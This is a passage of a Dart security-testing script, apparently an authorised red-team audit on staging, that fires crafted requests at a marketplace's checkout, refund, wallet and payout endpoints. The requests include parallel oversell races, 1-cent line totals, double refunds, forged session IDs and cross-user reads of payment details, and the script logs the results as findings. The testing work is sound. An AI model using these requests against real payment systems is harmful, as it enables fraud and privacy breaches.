        attack: '10 POST checkout paralelo stock=1',
        identity: 'buyer',
        result: {
          'http200': ok,
          'https': [for (final r in rs) r['http']],
          'sessions': sessions.whereType<String>().toSet().length,
          'sample': clip(rs.first['text'], 140),
        },
        impact: ok > 1
            ? 'N Sessions no mesmo stock=1 (captura ainda não)'
            : 'stock gate na criação',
        severity: ok > 1 ? 'P1?' : 'info',
      );
    }

    // Seller marca vendido / cancela enquanto checkout
    if (orders.isNotEmpty) {
      final ckFut = edge('create-payment-intent', {
        'buyer_id': buyerId,
        'order_id': orders.first,
        'product_id': racePid,
        'amount': 50,
        'shipping_method': 'hand',
      }, BH);
      final soldFut = httpJson(
        'PATCH',
        '$url/rest/v1/products?id=eq.$racePid',
        SH,
        {'is_sold': true, 'list_on_marketplace': false, 'quantity': 0},
      );
      final cancelFut = httpJson(
        'PATCH',
        '$url/rest/v1/orders?id=eq.${orders.first}',
        SH,
        {'status': 'cancelado'},
      );
      final trio = await Future.wait([ckFut, soldFut, cancelFut]);
      hit(
        surface: 'conluio race',
        attack: 'checkout ∥ seller is_sold + cancel order',
        identity: 'buyer+seller',
        result: {
          'checkout': '${trio[0]['http']} ${clip(trio[0]['text'], 100)}',
          'sold': trio[1]['http'],
          'cancel': trio[2]['http'],
          'order': await row('orders', orders.first),
          'product': await row('products', racePid),
        },
        impact: 'estado final vs Session',
      );
    }
  }

  // Bag mutation: two lines, mutate qty mid
  final bagA = await insertProduct(title: '$tag bagA 6.00', price: 6.0, qty: 3);
  final bagB = await insertProduct(title: '$tag bagB 6.00', price: 6.0, qty: 3);
  if (bagA['id'] != null && bagB['id'] != null) {
    final oa = await insertOrder(
      hdr: BH,
      productId: bagA['id'] as String,
      asBuyer: buyerId,
      extra: {'price_total': 6.0, 'shipping_method': 'hand'},
    );
    final ob = await insertOrder(
      hdr: BH,
      productId: bagB['id'] as String,
      asBuyer: buyerId,
      extra: {'price_total': 6.0, 'shipping_method': 'hand'},
    );
    if (oa['id'] != null && ob['id'] != null) {
      await httpJson(
        'PATCH',
        '$url/rest/v1/orders?id=eq.${ob['id']}',
        BH,
        {'quantity': 3},
      );
      final bagCk = await edge('create-payment-intent', {
        'buyer_id': buyerId,
        'order_id': oa['id'],
        'bag_checkout': true,
        'bag_lines': [
          {
            'order_id': oa['id'],
            'product_id': bagA['id'],
            'line_total_cents': 1,
            'quantity': 1,
          },
          {
            'order_id': ob['id'],
            'product_id': bagB['id'],
            'line_total_cents': 1,
            'quantity': 99,
          },
        ],
        'amount': 50,
        'shipping_method': 'hand',
      }, BH);
      hit(
        surface: 'bag',
        attack: 'bag 2 linhas; qty PATCH + line_total 1c',
        identity: 'buyer',
        result: {
          'http': bagCk['http'],
          'server': (bagCk['body'] is Map)
              ? (bagCk['body'] as Map)['server_amount_cents']
              : clip(bagCk['text'], 160),
          'ob': await row('orders', ob['id'] as String),
        },
        impact: 'qty/line_total body vs contrato',
      );
    }
  }

  // Direct payment details cross-user
  if (offOrderRow != null) {
    final det = await rpcTry('batata_seller_direct_payment_details', {
      'p_order_id': offOrderRow['id'],
    }, buyer2Tok != null ? H(buyer2Tok) : AH);
    hit(
      surface: 'RPC/direct_payment',
      attack: 'buyer2 lê dados MB WAY da order alheia',
      identity: 'buyer_malicioso',
      result: 'http=${det['http']} ${clip(det['text'], 180)}',
      impact: (det['http'] as int) == 200 ? 'P1 privacidade bancária' : 'scope',
      severity: (det['http'] as int) == 200 ? 'P1' : 'info',
    );
  }

  // -------------------------------------------------------------------------
  // POÇO 1 — captura REAL TEST via e2e fixture + contabilidade + disputa+refund
  // -------------------------------------------------------------------------
  Map<String, dynamic>? paidFix;
  if (e2eSecret.length >= 16) {
    final setup = await httpJson(
      'POST',
      '$url/functions/v1/sec-fase2-e2e-oversell',
      {
        'apikey': anon,
        'Authorization': 'Bearer $anon',
        'Content-Type': 'application/json',
        'x-fleaber-e2e-secret': e2eSecret,
      },
      {
        'probe': 'setup_paid_order',
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'initial_qty': 2,
      },
    );
    paidFix = setup['body'] is Map
        ? Map<String, dynamic>.from(setup['body'] as Map)
        : null;
    hit(
      surface: 'captura TEST',
      attack: 'e2e setup_paid_order pm_card_visa (fixture)',
      identity: 'fixture_e2e',
      result: {
        'http': setup['http'],
        'ok': paidFix?['ok'],
        'order_id': paidFix?['order_id'],
        'pi': paidFix?['payment_intent_id'],
        'pi_recv': paidFix?['pi_amount_received'],
        'order': paidFix?['order'],
      },
      impact: 'captura real TEST para contabilidade',
    );
    if (paidFix?['order_id'] != null) {
      createdOrderIds.add('${paidFix!['order_id']}');
    }
    if (paidFix?['product_id'] != null) {
      createdProductIds.add('${paidFix!['product_id']}');
    }
  } else {
    gaps.add('sem FLEABER_STAGING_CRASH_INJECT_SECRET — sem captura e2e');
  }

  if (stripeLocal.startsWith('sk_test_')) {
    gaps.add('STRIPE_SECRET_KEY local presente — Checkout Session API possível');
  } else {
    gaps.add(
      'STRIPE_SECRET_KEY ausente no env local — Session Checkout da app não paga via API; captura = e2e PI TEST',
    );
  }

  // Dual settle GET replay se temos session
  if (paidFix?['order_id'] != null) {
    final oid = '${paidFix!['order_id']}';
    final orderPaid = await row('orders', oid);
    final captured = Numberish(orderPaid?['amount_paid_cents']);
    final txBefore = await walletTx(oid);
    final balB0 = await walletBal(buyerId);
    final balS0 = await walletBal(sellerId);

    // Replay settle e2e (service as fixture replay — actor JWT também)
    final replayJwt = await edge(
      'create-payment-intent',
      {
        'order_id': oid,
        'payment_intent_id': paidFix['payment_intent_id'],
        'product_id': paidFix['product_id'],
      },
      BH,
      qs: '?fase2_e2e_settle=1',
    );
    hit(
      surface: 'settle replay',
      attack: 'buyer JWT re-settle PI já pago',
      identity: 'buyer',
      result: 'http=${replayJwt['http']} ${clip(replayJwt['text'], 140)}',
      impact: 'não deve 2º mint',
    );

    // Release seller wallet (seller JWT) then refund buyer then stripe refund
    final rel = await rpcTry('batata_release_seller_wallet_for_order', {
      'p_order_id': oid,
    }, SH);
    final afterRel = await walletTx(oid);
    final balSRel = await walletBal(sellerId);

    // Dispute 100% as buyer
    final disp = await rpcTry('batata_process_partial_refund_dispute', {
      'p_order_id': oid,
      'p_refund_percent': 100,
    }, BH);
    final afterDisp = await walletTx(oid);
    final balBDisp = await walletBal(buyerId);
    final balSDisp = await walletBal(sellerId);
    final walletRefundRpc = await rpcTry('batata_order_wallet_reembolso_cents', {
      'p_order_id': oid,
    }, BH);

    hit(
      surface: 'wallet ciclo',
      attack: 'release seller + disputa 100% buyer',
      identity: 'buyer+seller',
      result: {
        'release_http': rel['http'],
        'release_body': clip(rel['text'], 120),
        'disp_http': disp['http'],
        'disp_body': clip(disp['text'], 160),
        'tx_before': txBefore.length,
        'tx_after_rel': afterRel.length,
        'tx_after_disp': afterDisp.length,
        'dSeller_rel': balSRel - balS0,
        'dBuyer_disp': balBDisp - balB0,
        'dSeller_disp': balSDisp - balS0,
        'wallet_refund_cents': walletRefundRpc['body'],
        'captured_cents': captured,
      },
      impact: 'contabilidade captura vs wallet',
    );

    // Stripe refund-order after wallet 100%
    final rf = await edge('refund-order', {'order_id': oid}, SH);
    final afterRf = await row('orders', oid);
    final txFinal = await walletTx(oid);
    final balBEnd = await walletBal(buyerId);
    final balSEnd = await walletBal(sellerId);

    // Observe Stripe refund amount via e2e list if possible
    Map<String, dynamic>? stripeRefunds;
    if (e2eSecret.length >= 16 && paidFix['payment_intent_id'] != null) {
      final listed = await httpJson(
        'POST',
        '$url/functions/v1/sec-fase2-e2e-oversell',
        {
          'apikey': anon,
          'Authorization': 'Bearer $anon',
          'Content-Type': 'application/json',
          'x-fleaber-e2e-secret': e2eSecret,
        },
        {
          'probe': 'list_stripe_refunds',
          'payment_intent_id': paidFix['payment_intent_id'],
        },
      );
      stripeRefunds = listed['body'] is Map
          ? Map<String, dynamic>.from(listed['body'] as Map)
          : {'http': listed['http'], 'text': clip(listed['text'], 200)};
    }

    final walletRefundCents = Numberish(walletRefundRpc['body']);
    final stripeRefundAmt = _sumRefunds(stripeRefunds);
    final netDouble = walletRefundCents + stripeRefundAmt;
    hit(
      surface: 'refund composto',
      attack: 'wallet disputa 100% + refund-order Stripe',
      identity: 'seller Stripe + buyer wallet',
      result: {
        'refund_http': rf['http'],
        'refund_body': clip(rf['text'], 220),
        'order_status': afterRf?['status'],
        'stripe_refund_id': afterRf?['stripe_refund_id'],
        'wallet_refund_cents': walletRefundCents,
        'stripe_refund_cents': stripeRefundAmt,
        'captured': captured,
        'sum_restitution': netDouble,
        'dBuyer_end': balBEnd - balB0,
        'dSeller_end': balSEnd - balS0,
        'tx_final': [
          for (final t in txFinal) {'type': t['type'], 'amount': t['amount']}
        ],
        'stripe_list': stripeRefunds,
      },
      impact: netDouble > captured + 1
          ? 'RESTITUIÇÃO > CAPTURA'
          : 'cap residual / bloqueio',
      severity: netDouble > captured + 1 ? 'P0' : 'info',
    );
    if (netDouble > captured + 1 && captured > 0) {
      finding(
        id: 'RTC-C-CASH-001',
        sev: 'P0',
        title: 'Disputa wallet + Stripe refund > captura',
        actor: 'buyer JWT disputa + seller refund-order',
        pre: 'order pago PI TEST $captured cêntimos',
        repro:
            'setup_paid_order → batata_process_partial_refund_dispute 100% → refund-order',
        impact:
            'wallet_refund=$walletRefundCents + stripe=$stripeRefundAmt > captured=$captured',
      );
    }

    // Replay refund-order
    final rf2 = await edge('refund-order', {'order_id': oid}, SH);
    hit(
      surface: 'refund replay',
      attack: '2º refund-order mesma order',
      identity: 'seller',
      result: 'http=${rf2['http']} ${clip(rf2['text'], 180)}',
      impact: 'idempotência',
    );
  }

  // Dual payout keys if seller has balance
  final sBal = await walletBal(sellerId);
  if (sBal >= 1.0) {
    final k1 = '$tag-payout-k1';
    final k2 = '$tag-payout-k2';
    final a = await edge('create-connect-account', {
      'amount': 100,
      'idempotency_key': k1,
    }, SH);
    final b = await edge('create-connect-account', {
      'amount': 100,
      'idempotency_key': k2,
    }, SH);
    hit(
      surface: 'payout dual-key',
      attack: 'dois payouts 100c keys distintas',
      identity: 'seller',
      result: {
        'a': '${a['http']} ${clip(a['text'], 120)}',
        'b': '${b['http']} ${clip(b['text'], 120)}',
        'balance_before': sBal,
      },
      impact: '2 intenções → 2 Transfers ou 2º bloqueado por saldo',
    );
  } else {
    gaps.add('payout dual-key: saldo seller $sBal < 1€ — Transfer real não saturada');
  }

  // Oversell e2e (2 PI stock=1) — fixture, observe final state
  if (e2eSecret.length >= 16) {
    final ov = await httpJson(
      'POST',
      '$url/functions/v1/sec-fase2-e2e-oversell',
      {
        'apikey': anon,
        'Authorization': 'Bearer $anon',
        'Content-Type': 'application/json',
        'x-fleaber-e2e-secret': e2eSecret,
      },
      {
        'buyer_id': buyerId,
        'seller_id': sellerId,
      },
    );
    hit(
      surface: 'oversell e2e',
      attack: '2 PI TEST stock=1 settle sequencial',
      identity: 'fixture_e2e',
      result: {
        'http': ov['http'],
        'clip': clip(ov['text'], 400),
      },
      impact: '1 pago + 1 refund vs 2 pagos',
    );
  }

  // Settle GET sem JWT (Session inventada)
  final getSettle = await httpJson(
    'GET',
    '$url/functions/v1/create-payment-intent?checkout_return=success&session_id=cs_test_$tag',
    {'apikey': anon},
  );
  hit(
    surface: 'GET settle',
    attack: 'session_id forjado sem JWT',
    identity: 'anon',
    result: 'http=${getSettle['http']} ${clip(getSettle['text'], 140)}',
    impact: 'não deve marcar pago',
  );

  // -------------------------------------------------------------------------
  // Cleanup (nossas fixtures; não apagar lab users)
  // -------------------------------------------------------------------------
  for (final oid in createdOrderIds) {
    await httpJson(
      'PATCH',
      '$url/rest/v1/orders?id=eq.$oid',
      SVC,
      {'status': 'cancelado'},
    );
  }
  for (final pid in createdProductIds) {
    await httpJson(
      'PATCH',
      '$url/rest/v1/products?id=eq.$pid',
      SVC,
      {'list_on_marketplace': false, 'is_sold': true},
    );
  }

  final buyerBal1 = await walletBal(buyerId);
  final sellerBal1 = await walletBal(sellerId);

  final out = {
    'AUDITOR': 'PARALLEL_C_DEEP_CASH',
    'PARALLEL_WITH': 'INDEP_BLIND + REDTEAM_B',
    'FROZEN_AT': frozenAt,
    'production_touched': false,
    'fase4': false,
    'corrections_applied': false,
    'tag': tag,
    'wallet_buyer_delta': buyerBal1 - buyerBal0,
    'wallet_seller_delta': sellerBal1 - sellerBal0,
    'rpc_count': rpcNames.length,
    'matrix': matrix,
    'findings': findings,
    'gaps': gaps,
    'created_products': createdProductIds,
    'created_orders': createdOrderIds,
  };

  final jsonPath = 'tool/reports/REDTEAM_PARALLEL_C_20260830T1115.json';
  await Directory('tool/reports').create(recursive: true);
  await File(jsonPath).writeAsString(const JsonEncoder.withIndent('  ').convert(out));
  print('JSON $jsonPath matrix=${matrix.length} findings=${findings.length}');
  print('Δwallet buyer=${buyerBal1 - buyerBal0} seller=${sellerBal1 - sellerBal0}');
}

num Numberish(Object? v) {
  if (v is num) return v;
  return num.tryParse('$v') ?? 0;
}

int _sumRefunds(Map<String, dynamic>? listed) {
  if (listed == null) return 0;
  // e2e list_stripe_refunds shape unknown — try common keys
  final data = listed['refunds'] ?? listed['data'] ?? listed['amounts'];
  if (data is List) {
    var n = 0;
    for (final e in data) {
      if (e is Map) {
        n += Numberish(e['amount'] ?? e['amount_cents']).round();
      } else if (e is num) {
        n += e.round();
      }
    }
    return n;
  }
  return Numberish(listed['total_refunded'] ?? listed['refunded_cents']).round();
}
